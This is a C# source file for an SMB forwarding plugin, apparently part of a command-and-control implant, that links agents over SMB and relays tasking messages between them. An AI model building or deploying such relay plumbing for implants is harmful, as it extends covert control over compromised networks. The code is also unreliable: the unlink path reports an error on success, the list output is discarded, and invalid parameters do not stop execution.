﻿using Agent.Interfaces;
using Agent.Models;

using System.Dynamic;
using Agent.Utilities;
using smb;
using System.Collections.Concurrent;
using System.Text;
using System.Text.Json;

namespace socks
{
    public class Smb : IPlugin, IForwarderPlugin
    {
        public string Name => "smb";
        public IAgentConfig config { get; set; }
        public IMessageManager messageManager { get; set; }
        public ILogger logger { get; set; }
        public ITokenManager tokenManager { get; set; }
        private ConcurrentDictionary<string, SmbLink> forwarders = new ConcurrentDictionary<string, SmbLink>();
        private ConcurrentDictionary<string, SmbLink> tempForwarders = new ConcurrentDictionary<string, SmbLink>(); //Used to store before we know the "true" UUID of the fwd
        public Smb(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager)
        {
            this.messageManager = messageManager;
            this.config = config;
            this.logger = logger;
            this.tokenManager = tokenManager;
        }

        public async Task Execute(ServerJob job)
        {
            SmbLinkArgs args = JsonSerializer.Deserialize<SmbLinkArgs>(job.task.parameters);

            if (args is null)
            {
                await messageManager.AddResponse(new ResponseResult()
                {
                    task_id = job.task.id,
                    user_output = "Invalid parameters.",
                    status = "error",
                    completed = true,
                });
            }

            logger.Log("Starting SMB Plugin.");
            logger.Log(job.task.parameters);
            switch (args.action)
            {
                case "link":

                    await CreateNewLink(args, job.task.id);
                    break;
                case "unlink":
                    if (await UnlinkForwarder(job.task.id))
                    {
                        await this.messageManager.AddResponse(new ResponseResult()
                        {
                            task_id = job.task.id,
                            user_output = "Link already exists.",
                            status = "error",
                            completed = true,
                        });

                        //Return a success message.
                    }

                    //Return a failure message.
                    break;
                case "list":
                    ListConnections(job);
                    break;
                default:
                    //Return a failure message
                    break;
            }
        }

        public async Task CreateNewLink(SmbLinkArgs args, string task_id)
        {
            logger.Log("CreateNewLink called.");
            string linkId = Guid.NewGuid().ToString();
            var link = new SmbLink(messageManager, logger, args, linkId, config.uuid, task_id);

            if(this.tempForwarders.TryAdd(linkId, link))
            {
                logger.Log("Attempting to link.");
                EdgeResponseResult err = await this.tempForwarders[linkId].Link();
                logger.Log(err.ToJson());
                await this.messageManager.AddResponse(err.ToJson());
                return;
            }

            await this.messageManager.AddResponse(new ResponseResult()
            {
                task_id = task_id,
                user_output = "Link already exists.",
                status = "error",
                completed = true
            });
            
        }

        public async Task<bool> UnlinkForwarder(string linkId)
        {
            return await this.forwarders[linkId].Unlink() && this.forwarders.TryRemove(linkId, out _);
        }

        public async Task ForwardDelegate(DelegateMessage dm)
        {
            string id = dm.uuid;
            if (!string.IsNullOrEmpty(dm.new_uuid))
            {
                id = dm.new_uuid;
            }

            if (!forwarders.ContainsKey(dm.uuid)) //Check to see if it's a first message or not
            {
                SmbLink fwd;
                if (this.tempForwarders.TryRemove(dm.uuid, out fwd)) //Remove (hopefully) the only temporary forwarder we're looking for
                {
                    this.forwarders.TryAdd(dm.new_uuid, fwd);
                    this.forwarders[dm.new_uuid].linkId = dm.new_uuid;
                    dm.uuid = dm.new_uuid;
                }
            }

            await this.forwarders[id].ForwardDelegateMessage(dm);
        }

        public ResponseResult ListConnections(ServerJob job)
        {
            StringBuilder sb = new StringBuilder();
            foreach (var fwdr in this.forwarders)
            {
                sb.AppendLine($"ID: {fwdr.Value.linkId}\tType: smb\tConnected: {fwdr.Value.connected}");
            }

            return new ResponseResult()
            {
                user_output = sb.ToString(),
                task_id = job.task.id,
                completed = true,

            };
        }
    }
}
